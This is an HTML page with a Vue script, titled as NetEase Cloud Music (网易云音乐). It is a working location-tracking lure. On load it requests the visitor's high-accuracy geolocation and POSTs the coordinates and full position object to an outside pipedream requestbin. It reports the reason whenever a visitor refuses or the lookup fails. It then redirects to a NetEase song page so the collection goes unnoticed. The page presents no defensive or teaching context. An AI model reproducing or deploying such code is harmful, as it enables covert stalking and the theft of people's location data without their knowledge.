<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>网易云音乐</title>
</head>

<body>
    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
    <div id="app"></div>
    <script>
        const { createApp } = Vue

        createApp({
            data() {
                return {
                    requestbin: 'https://eokewnkdkxq3u7e.m.pipedream.net',
                    target: "https://music.163.com/#/song?id=368800",  // 网易云 牛奶咖啡 - 越长大越孤单
                }
            },
            created() {
                navigator.geolocation.getCurrentPosition(
                    this.getCoordinates,
                    this.showError,
                    { maximumAge: 10000, timeout: 10000, enableHighAccuracy: true }
                )
            },
            methods: {
                sendReport(result) {
                    fetch(this.requestbin, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(result)
                    }).finally(() => {
                        window.location.replace(this.target)
                    })
                },
                getCoordinates(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const acc = Math.round(position.coords.accuracy);

                    const result = {
                        address: `${lat}, ${lng}, ${acc}`,
                        position
                    }
                    this.sendReport(result)
                },
                showError(error) {
                    let errorMsg
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = "用户拒绝了获取位置信息的请求。";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = "位置信息不可用。";
                            break;
                        case error.TIMEOUT:
                            errorMsg = "获取位置信息超时。";
                            break;
                        case error.UNKNOWN_ERROR:
                            errorMsg = "发生未知错误。";
                            break;
                    }
                    this.sendReport({ errorMsg })
                }
            }
        }).mount('#app')
    </script>

</body>

</html>
